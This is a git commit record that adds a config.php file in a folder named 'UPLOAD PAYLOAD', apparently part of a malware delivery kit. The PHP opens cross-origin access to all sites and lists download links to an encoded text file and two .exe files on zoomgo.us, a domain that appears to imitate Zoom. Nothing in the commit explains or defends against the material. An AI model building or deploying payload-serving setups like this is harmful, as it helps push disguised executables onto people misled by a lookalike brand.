d56fe7ae914dc0347b0dfcc2a645ca16c271672a
wick3dhub <130564370+wick3dhub@users.noreply.github.com>
2024-11-24 09:15:43 -0500

    Create config.php
    Signed-off-by: wick3dhub <130564370+wick3dhub@users.noreply.github.com>

---
+++ UPLOAD PAYLOAD/config.php
@@ -0,0 +1,11 @@
+<?php
+// Allow cross-origin requests
+header("Access-Control-Allow-Origin: *");
+
+// Define the list of files without outputting anything
+$downloadFiles = [
+    "file1" => "https://app.zoomgo.us/npKmSFmv/encoded.txt",
+    "file2" => "https://zoomgo.us/files/sample2.exe",
+    "file3" => "https://zoomgo.us/files/sample3.exe"
+];
+?>
